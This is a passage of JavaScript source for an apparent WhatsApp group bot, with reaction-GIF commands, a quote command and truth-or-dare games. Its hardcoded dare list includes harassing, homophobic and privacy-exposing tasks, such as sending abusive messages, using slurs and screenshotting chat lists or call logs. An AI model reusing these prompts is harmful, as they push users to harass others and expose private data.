        }

      }

        break;
        case 'slap': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/slap`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} slapped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} slapped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smile': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smile`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smiled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smiled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wave': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wave`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} waved themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} waved @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'awoo': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} awooed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} awooed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'blush': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/blush`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} blushed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} blushed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smug': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'glomp': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/glomp`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} glomped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} glomped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'happy': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/happy`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} happied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} happied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'dance': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/dance`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} danced themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} danced @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cringe': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cringe`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cringed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cringed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cuddle': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cuddle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cuddled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cuddled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'highfive': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} highfived themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} highfived @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'handhold': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/handhold`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} handheld themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} handheld @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'spank': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/spank`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} spanked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} spanked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'feed': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/feed`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} fed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} fed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'tickle': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/tickle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} tickled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} tickled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
			case 'quotes':{
const quoteverany = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quoteverany.data.quote.body}\n\n*${themeemoji} Author:* ${quoteverany.data.quote.author}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: textquotes
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'truth': case 'dare': {
	bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease Choose The Button Below`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Truth 🌝\",\"id\":\"${prefix}turut"}`
            },
{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Dare 🌚\",\"id\":\"${prefix}dere"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'dere':{
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner veran through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const verandare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose DARE_\n'+ verandare
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"PLAY AGAIN 🤔\",\"id\":\"${prefix}dare"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
              break
                            break
       case 'turut':{
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, veran?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const verantruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose TRUTH_\n'+ verantruth
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"PLAY AGAIN 🤔\",\"id\":\"${prefix}truth"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
              break
			case 'pickupline': {
try {
    let res = await fetch(`https://api.popcat.xyz/pickuplines`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    let pickupLine = `*Here's a pickup line for you:*\n\n${json.pickupline}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: pickupLine
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
